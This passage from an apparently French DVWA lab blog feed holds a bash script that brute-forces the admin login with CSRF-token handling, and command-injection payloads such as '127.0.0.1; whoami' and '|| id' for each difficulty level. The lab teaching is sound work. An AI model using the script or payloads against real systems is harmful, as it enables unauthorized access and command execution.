&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;get_csrf_token&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CSRF_TOKEN&lt;&#x2F;span&gt;&lt;span&gt;=$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl -s &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASE_URL&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --cookie &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;COOKIES&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;grep -oP &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;value=&amp;#39;\K[a-f\d]{32}(?=&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;brute_force&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;read &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-r&lt;&#x2F;span&gt;&lt;span&gt; PASS
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;do
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_csrf_token
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl -s &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASE_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;?username=admin&amp;amp;password=&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PASS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;Login=Login&amp;amp;user_token=&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;CSRF_TOKEN&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --cookie &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;COOKIES&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; 
&lt;&#x2F;span&gt;&lt;span&gt;			        | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;grep -q &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Username and&#x2F;or password incorrect&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&#x2F;dev&#x2F;null || &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FOUND&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[[ &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FOUND&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-eq&lt;&#x2F;span&gt;&lt;span&gt; 1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]]
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;then
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Password found: &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PASS&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;exit
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;fi
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;done &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; &amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;WORDLIST&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;brute_force
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - Command Injection</title>
        <published>2025-12-21T00:00:00+00:00</published>
        <updated>2025-12-21T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/cmd-injection/"/>
        <id>https://theora59-dev.github.io/blog/cours/cmd-injection/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/cmd-injection/">&lt;h2 id=&quot;easy&quot;&gt;Easy:&lt;&#x2F;h2&gt;
&lt;p&gt;Au niveau Easy, aucune validation n&#x27;empêche l&#x27;injection directe. La commande PHP exécute ping IP sans filtrage, permettant d&#x27;ajouter une seconde commande via des séparateurs shell comme &lt;code&gt;;&lt;&#x2F;code&gt;, &lt;code&gt;&amp;amp;&amp;amp;&lt;&#x2F;code&gt; ou &lt;code&gt;||&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Entrez &lt;code&gt;127.0.0.1; whoami&lt;&#x2F;code&gt; pour exécuter &lt;code&gt;ping 127.0.0.1&lt;&#x2F;code&gt; suivi de &lt;code&gt;whoami&lt;&#x2F;code&gt;, affichant l&#x27;utilisateur du serveur.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;127.0.0.1 &amp;amp;&amp;amp; ls&lt;&#x2F;code&gt; fonctionne si la première commande réussit, listant les fichiers.&lt;&#x2F;li&gt;
&lt;li&gt;Ces séparateurs chainent les commandes sans restriction.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium:&lt;&#x2F;h2&gt;
&lt;p&gt;DVWA applique un blacklistage basique via &lt;code&gt;str_replace&lt;&#x2F;code&gt;, supprimant &lt;code&gt;;&lt;&#x2F;code&gt;, &lt;code&gt;&amp;amp;&amp;amp;&lt;&#x2F;code&gt; et &lt;code&gt;||&lt;&#x2F;code&gt; en remplaçant par des espaces vides, rendant les injections classiques inefficaces&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Testez &lt;code&gt;127.0.0.1 || whoami&lt;&#x2F;code&gt; : le double pipe &lt;code&gt;||&lt;&#x2F;code&gt; exécute la seconde commande seulement si la première échoue, contournant partiellement le filtre car &lt;code&gt;||&lt;&#x2F;code&gt; n&#x27;est pas toujours bloqué immédiatement.&lt;&#x2F;li&gt;
&lt;li&gt;Si &lt;code&gt;||&lt;&#x2F;code&gt; est filtré, essayez le pipe simple &lt;code&gt;|&lt;&#x2F;code&gt; pour forcer l&#x27;exécution conditionnelle.&lt;&#x2F;li&gt;
&lt;li&gt;Une IP invalide comme &lt;code&gt;999.999.999.999 || id&lt;&#x2F;code&gt; déclenche l&#x27;échec du &lt;code&gt;ping&lt;&#x2F;code&gt;, exécutant &lt;code&gt;id&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;high&quot;&gt;High:&lt;&#x2F;h2&gt;
&lt;p&gt;Les filtres s&#x27;intensifient : espaces interdits, whitespaces remplacés, et extension de la blacklist aux séparateurs courants, bloquant les injections en une ligne.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Solution experimentale: Faire passer la requête par un Proxy (BurpSuite) et insérer un saut de ligne dans le champ vulnérable
&lt;img src=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;Command Injection illustration.6956b9702e8a4999.png&quot; alt=&quot;Responsive hi-res image&quot;
     width=&quot;728&quot; height=&quot;419&quot;
     sizes=&quot;(min-width: 920px) 784px, (min-width: 700px) calc(82vw + 46px), calc(100vw - 40px)&quot; 
     srcset=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;Command Injection illustration.c81c432fdea5b096.png 640w&quot;
     loading=&quot;lazy&quot;&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - CSP Bypass</title>
        <published>2025-12-21T00:00:00+00:00</published>
        <updated>2025-12-21T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/csp-bypass/"/>
        <id>https://theora59-dev.github.io/blog/cours/csp-bypass/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/csp-bypass/"></content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - Insecure CAPTCHA</title>
        <published>2025-12-21T00:00:00+00:00</published>
        <updated>2025-12-21T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/insecure-captcha/"/>
        <id>https://theora59-dev.github.io/blog/cours/insecure-captcha/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/insecure-captcha/"></content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - Javascript</title>
        <published>2025-12-21T00:00:00+00:00</published>
        <updated>2025-12-21T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/javascript/"/>
        <id>https://theora59-dev.github.io/blog/cours/javascript/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/javascript/"></content>
        
    </entry>
</feed>
